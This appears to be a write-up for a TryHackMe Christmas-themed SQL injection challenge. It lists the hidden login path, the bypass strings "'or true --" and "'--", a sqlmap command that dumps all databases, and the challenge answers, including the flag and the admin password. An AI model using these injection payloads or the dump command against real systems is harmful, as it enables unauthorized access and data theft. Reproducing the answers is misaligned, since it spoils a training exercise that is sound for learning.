---
description: Web Exploitation ; sql injection ; sqli ; sqlmap
---

# Someone stole Santa's gift list!

## Video

{% embed url="https://www.youtube.com/watch?v=Kitx7cSNsuE" %}

## Resources

List of SQL Commands: [https://www.codecademy.com/articles/sql-commands](https://www.codecademy.com/articles/sql-commands)

Check out this cheat sheet: [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

Payload list: [payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)

In-depth SQL Injection tutorial: [SQLi Basics](https://tryhackme.com/room/sqlibasics)

[SQLMAP cheatsheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)

## Challenge

![](<../.gitbook/assets/image (31).png>)

### Without using directory brute forcing, what's Santa's secret login panel?

![](<../.gitbook/assets/image (32).png>)

{% hint style="success" %}
/santapanel
{% endhint %}

### Visit Santa's secret login panel and bypass the login using SQLi

![](<../.gitbook/assets/image (33).png>)

`Username` `'or true --`

`Password` `'--`

![](<../.gitbook/assets/image (34).png>)

{% hint style="success" %}
No answer needed
{% endhint %}

### How many entries are there in the gift database?

![](<../.gitbook/assets/image (35).png>)

**`Save Item`**

`sqlmap -r santapanel.req --tamper=space2comment --dump-all -dbms sqlite`

![](<../.gitbook/assets/image (36).png>)

![](<../.gitbook/assets/image (37).png>)

{% hint style="success" %}
22
{% endhint %}

### What did Paul ask for?

![](<../.gitbook/assets/image (38).png>)

{% hint style="success" %}
Github Ownership
{% endhint %}

### What is the flag?

![](<../.gitbook/assets/image (39).png>)

{% hint style="success" %}
thmfox{All\_I\_Want\_for\_Christmas\_Is\_You}
{% endhint %}

### What is admin's password?

![](<../.gitbook/assets/image (40).png>)

{% hint style="success" %}
EhCNSWzzFP6sc7gB
{% endhint %}
